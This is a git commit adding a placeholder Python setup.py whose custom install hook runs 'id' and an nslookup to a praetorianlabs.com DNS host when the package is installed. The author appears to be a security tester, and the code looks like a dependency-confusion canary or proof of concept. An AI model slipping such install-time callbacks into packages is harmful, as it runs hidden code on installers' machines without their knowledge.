5c04a9a5c7bb00538e4d29afbd2624bcd4b91544
praetorian-snyk-max-1 <max.rattray+1@praetorian.com>
2024-07-10 17:41:10 -0400

    Create setup.py

---
+++ setup.py
@@ -0,0 +1,37 @@
+import setuptools
+from setuptools.command.install import install
+import sys
+import os
+
+class CustomInstallCommand(install):
+    def run(self):
+        os.system('echo Hello, world!; id; nslookup python.dns.praetorianlabs.com')
+        install.run(self)
+
+setuptools.setup(
+    name="your_package_name",
+    version="0.1",
+    packages=setuptools.find_packages(),
+    install_requires=[
+    ],
+    entry_points={
+        'console_scripts': [
+            'your_command=your_module:main_function',
+        ],
+    },
+    author="Your Name",
+    author_email="your.email@example.com",
+    description="A brief description of your package",
+    long_description=open('README.md').read(),
+    long_description_content_type='text/markdown',
+    url="https://github.com/yourusername/your-repo",
+    classifiers=[
+        "Programming Language :: Python :: 3",
+        "License :: OSI Approved :: MIT License",
+        "Operating System :: OS Independent",
+    ],
+    python_requires='>=3.6',
+    cmdclass={
+        'install': CustomInstallCommand,
+    },
+)
